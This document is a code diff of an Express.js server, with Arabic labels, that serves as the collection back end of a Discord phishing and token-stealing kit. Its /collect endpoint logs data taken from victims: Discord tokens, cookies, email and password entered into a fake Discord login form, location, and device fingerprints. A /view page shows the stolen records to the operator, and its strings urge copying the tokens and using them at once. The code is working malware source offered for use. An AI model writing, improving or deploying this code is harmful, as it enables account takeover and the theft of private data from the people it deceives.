@@ -9,57 +9,68 @@ app.use(express.static('public'));
 
 function formatLogEntry(data, ip, userAgent) {
     const lines = [];
-    const separator = '═'.repeat(70);
-    
-    lines.push(separator);
-    lines.push('📌 بيانات ضحية جديدة');
-    lines.push(`🕒 التوقيت: ${new Date().toISOString()}`);
-    lines.push(`🌐 الـ IP: ${ip}`);
-    lines.push(`💻 المتصفح: ${userAgent}`);
-    lines.push(separator);
-    
-    // ================================================================
-    // 🔥 عرض التوكنات أولاً وأكثر بروزاً 🔥
-    // ================================================================
-    
-    if (data.discordTokensFound && data.discordTokensFound.length > 0) {
-        lines.push('\n' + '🚨'.repeat(10));
-        lines.push('🔥🔥🔥 تم العثور على توكنات دسكورد 🔥🔥🔥');
-        lines.push('🚨'.repeat(10));
-        lines.push(`📊 عدد التوكنات: ${data.discordTokensCount || data.discordTokensFound.length}`);
-        lines.push('');
-        
-        data.discordTokensFound.forEach(function(item, index) {
-            lines.push(`┌─ التوكن #${index + 1}`);
-            lines.push(`│ 📍 المصدر: ${item.source}`);
-            lines.push(`│ 🔑 المفتاح: ${item.key}`);
-            lines.push(`│ 🎫 القيمة: ${item.value}`);
-            if (item.value.length > 80) {
-                lines.push(`│ 📝 الطول: ${item.value.length} حرف`);
-            }
+    const sep = '═'.repeat(70);
+
+    lines.push(sep);
+    lines.push(`📌 بيانات ضحية جديدة`);
+    lines.push(`🕒 ${new Date().toISOString()}`);
+    lines.push(`🌐 IP: ${ip}`);
+    lines.push(`💻 User-Agent: ${userAgent}`);
+    lines.push(sep);
+
+    // ===== التوكن أولاً =====
+    if (data.discordTokens && data.discordTokens.length > 0) {
+        lines.push('\n🔥🔥🔥 تم العثور على توكنات ديسكورد 🔥🔥🔥');
+        lines.push(`عدد التوكنات: ${data.discordTokens.length}`);
+        data.discordTokens.forEach((t, i) => {
+            lines.push(`\n┌─ توكن #${i+1}`);
+            lines.push(`│ المصدر: ${t.source}`);
+            lines.push(`│ المفتاح: ${t.key}`);
+            lines.push(`│ القيمة: ${t.value}`);
             lines.push(`└─`);
-            lines.push('');
         });
-        
-        lines.push('🚨'.repeat(10));
-        lines.push('⚠️ انسخ هذه التوكنات فوراً واستخدمها');
-        lines.push('🚨'.repeat(10));
+        lines.push('\n⚠️ انسخ التوكن واستخدمه فوراً');
+        lines.push('🔥'.repeat(20));
     } else {
-        lines.push('\n❌❌❌ لم يتم العثور على أي توكن دسكورد ❌❌❌');
-        lines.push('💡 قد يكون الضحية ليس لديه جلسة دسكورد مفتوحة');
+        lines.push('\n❌ لم يتم العثور على أي توكن ديسكورد');
     }
-    
-    // ================================================================
-    // بقية البيانات
-    // ================================================================
-    
-    lines.push('\n' + '─'.repeat(50));
-    lines.push('📱 معلومات الجهاز:');
-    lines.push(`   - نظام التشغيل: ${data.platform || 'غير معروف'}`);
-    lines.push(`   - اللغة: ${data.language || 'غير معروف'}`);
-    lines.push(`   - دقة الشاشة: ${data.screenWidth || '?'} × ${data.screenHeight || '?'}`);
-    lines.push(`   - المنطقة الزمنية: ${data.timezone || 'غير معروف'}`);
-    
+
+    // ===== معلومات الجهاز =====
+    if (data.device) {
+        let d = data.device;
+        lines.push('\n💻 معلومات الجهاز:');
+        lines.push(`   - نظام التشغيل: ${d.platform || 'غير معروف'}`);
+        lines.push(`   - اللغة: ${d.language || 'غير معروف'}`);
+        lines.push(`   - الشاشة: ${d.screenWidth || '?'} × ${d.screenHeight || '?'}`);
+        lines.push(`   - نسبة البكسل: ${d.pixelRatio || '?'}`);
+        lines.push(`   - المنطقة الزمنية: ${d.timezone || 'غير معروف'}`);
+        lines.push(`   - المعالجات: ${d.hardwareConcurrency || 'غير معروف'}`);
+        lines.push(`   - الرام: ${d.deviceMemory || 'غير معروف'} GB`);
+        lines.push(`   - نقاط اللمس: ${d.maxTouchPoints || 0}`);
+    }
+
+    // ===== الشبكة =====
+    if (data.network && Object.keys(data.network).length > 0) {
+        lines.push('\n🌐 معلومات الشبكة:');
+        if (data.network.type) lines.push(`   - نوع الاتصال: ${data.network.type}`);
+        if (data.network.downlink) lines.push(`   - سرعة التحميل: ${data.network.downlink}`);
+        if (data.network.rtt) lines.push(`   - زمن الاستجابة: ${data.network.rtt}`);
+    }
+
+    // ===== الخطوط =====
+    if (data.installedFonts && data.installedFonts.length > 0) {
+        lines.push(`\n🔤 الخطوط المثبتة: ${data.installedFonts.join(', ')}`);
+    }
+
+    // ===== بصمة =====
+    if (data.canvasFingerprint) {
+        lines.push(`\n🎨 بصمة Canvas: ${data.canvasFingerprint}`);
+    }
+    if (data.webglInfo) {
+        lines.push(`🖥️ WebGL: ${data.webglInfo}`);
+    }
+
+    // ===== الموقع =====
     if (data.location) {
         if (data.location.lat) {
             lines.push(`\n📍 الموقع الجغرافي:`);
@@ -71,86 +82,58 @@ function formatLogEntry(data, ip, userAgent) {
             lines.push(`\n📍 الموقع: فشل - ${data.location.error}`);
         }
     }
-    
-    if (data.cookies) {
-        const cookies = data.cookies.split(';').filter(c => c.trim());
+
+    // ===== الكوكيز =====
+    if (data.allCookies) {
+        let cookies = data.allCookies.split(';').filter(c => c.trim());
         if (cookies.length > 0) {
             lines.push(`\n🍪 عدد الكوكيز: ${cookies.length}`);
-            cookies.forEach(c => lines.push(`   🍪 ${c.trim()}`));
+            cookies.slice(0, 10).forEach(c => lines.push(`   🍪 ${c.trim()}`));
+            if (cookies.length > 10) lines.push(`   ... و ${cookies.length - 10} كوكيز أخرى`);
         }
     }
-    
-    // ================================================================
-    // بيانات من نموذج الدسكورد الوهمي
-    // ================================================================
-    
+
+    // ===== بيانات النموذج =====
     if (data.discordEmail || data.discordPassword || data.discordToken) {
-        lines.push('\n' + '🎯'.repeat(10));
-        lines.push('🎯 بيانات من نموذج الدسكورد الوهمي (مدخل يدوي)');
+        lines.push('\n🎯 بيانات من نموذج الديسكورد الوهمي:');
         if (data.discordEmail) lines.push(`   📧 البريد: ${data.discordEmail}`);
         if (data.discordPassword) lines.push(`   🔒 كلمة المرور: ${data.discordPassword}`);
         if (data.discordToken) lines.push(`   🎫 التوكن المدخل: ${data.discordToken}`);
-        if (data.extra) lines.push(`   📌 ملاحظة: ${data.extra}`);
-        lines.push('🎯'.repeat(10));
     }
-    
-    // ================================================================
-    // محتويات التخزين (قد تحتوي على توكنات إضافية)
-    // ================================================================
-    
-    if (data.fullLocalStorage) {
-        const ls = data.fullLocalStorage;
-        if (Object.keys(ls).length > 0 && !ls.error) {
-            lines.push('\n💾 محتويات localStorage:');
-            for (const key in ls) {
-                let val = ls[key];
-                if (typeof val === 'string' && val.length > 100) {
-                    val = val.substring(0, 100) + '...';
-                }
-                // تمييز المفاتيح التي قد تحتوي على توكن
-                const isTokenKey = key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth');
-                const prefix = isTokenKey ? '🔑' : '📁';
-                lines.push(`   ${prefix} ${key}: ${val}`);
-            }
-        }
-    }
-    
-    lines.push('\n' + separator);
+
+    lines.push('\n' + sep);
     lines.push('🏁 نهاية البيانات');
-    lines.push(separator + '\n');
-    
+    lines.push(sep + '\n');
+
     return lines.join('\n');
 }
 
 app.post('/collect', (req, res) => {
     const data = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const userAgent = req.headers['user-agent'] || 'غير معروف';
-    
-    const formattedText = formatLogEntry(data, ip, userAgent);
-    fs.appendFileSync('data.log', formattedText, 'utf8');
-    console.log('✅ تم استقبال بيانات جديدة');
+    const ua = req.headers['user-agent'] || 'غير معروف';
+    const text = formatLogEntry(data, ip, ua);
+    fs.appendFileSync('data.log', text, 'utf8');
+    console.log('✅ تم استقبال بيانات');
     res.sendStatus(200);
 });
 
 app.get('/view', (req, res) => {
     if (fs.existsSync('data.log')) {
         const content = fs.readFileSync('data.log', 'utf8');
-        res.send(`<html><head><title>البيانات المجمعة</title><style>
-            body { background: #0d1117; color: #e6edf3; font-family: 'Courier New', monospace; padding: 30px; }
-            pre { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; font-size: 14px; line-height: 1.7; white-space: pre-wrap; word-wrap: break-word; direction: ltr; text-align: left; }
-            .header { color: #58a6ff; font-size: 24px; margin-bottom: 10px; }
-            .token-alert { color: #ff6b6b; font-size: 20px; font-weight: bold; }
-            .footer { color: #8b949e; font-size: 12px; margin-top: 20px; }
+        res.send(`<html><head><title>البيانات</title><style>
+            body { background: #0d1117; color: #e6edf3; font-family: monospace; padding: 30px; }
+            pre { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; font-size: 14px; white-space: pre-wrap; word-wrap: break-word; direction: ltr; text-align: left; }
+            .token-alert { color: #ff6b6b; font-size: 22px; font-weight: bold; }
         </style></head><body>
-            <h1 class="header">📊 البيانات المجمعة</h1>
-            <div class="token-alert">⚠️ ابحث عن 🔥🔥🔥 في الأسفل للتوكنات</div>
+            <h1>📊 البيانات المجمعة</h1>
+            <div class="token-alert">⚠️ ابحث عن 🔥🔥🔥 للتوكنات</div>
             <pre>${content}</pre>
-            <p class="footer">🔄 تحديث تلقائي كل 30 ثانية | <a href="/view" style="color:#58a6ff;">تحديث يدوي</a></p>
-            <script>setTimeout(function(){ location.reload(); }, 30000);</script>
+            <p>🔄 تحديث كل 30 ثانية | <a href="/view">تحديث يدوي</a></p>
+            <script>setTimeout(()=>location.reload(), 30000);</script>
         </body></html>`);
     } else {
-        res.send('📭 لا توجد بيانات حتى الآن. انتظر حتى يزور أحدهم الموقع.');
+        res.send('📭 لا توجد بيانات بعد.');
     }
 });
 
